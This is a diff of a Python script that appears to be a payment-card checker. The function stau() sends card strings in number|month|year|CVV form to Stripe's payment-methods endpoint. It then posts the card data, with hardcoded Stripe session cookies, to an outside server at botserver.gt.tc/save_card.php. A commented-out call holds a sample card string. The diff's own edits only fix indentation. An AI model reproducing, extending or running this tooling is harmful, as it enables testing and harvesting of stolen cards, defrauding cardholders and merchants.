@@ -126,19 +126,19 @@ def stau(ccx):
 
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
-    #print(response.text)
+#    print(response.text)
     try:
         ide = (response.json()["id"])
-        #print(ide)
+#        print(ide)
     except:
         return (response.json()["error"]["message"])
         pass
-	cookies = {
-	    '__stripe_mid': '77a1b87a-b4e9-46af-b659-85e9b249bd099a7459',
-	    '__test': 'bcd924d9a84b55853dc2833f9ac5338a',
-	    '__stripe_sid': '0e7e6b1a-cb0b-4e1a-b47a-426d2e95c528d99fd1',
-	}
 
+    cookies = {
+        '__stripe_mid': '77a1b87a-b4e9-46af-b659-85e9b249bd099a7459',
+        '__test': 'bcd924d9a84b55853dc2833f9ac5338a',
+        '__stripe_sid': '0e7e6b1a-cb0b-4e1a-b47a-426d2e95c528d99fd1',
+    }
     headers = {
         'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
@@ -160,7 +160,6 @@ def stau(ccx):
     }
 
     response = requests.post('https://botserver.gt.tc/save_card.php', cookies=cookies, headers=headers, json=json_data)
-
 
 #    print(response.text)
     time.sleep(5)
@@ -327,4 +326,4 @@ def stau2(ccx):
     except:
         return ide2
 
-#stau1('4217834034502354|11|2025|306')
+#stau('4217834034502354|11|2025|306')
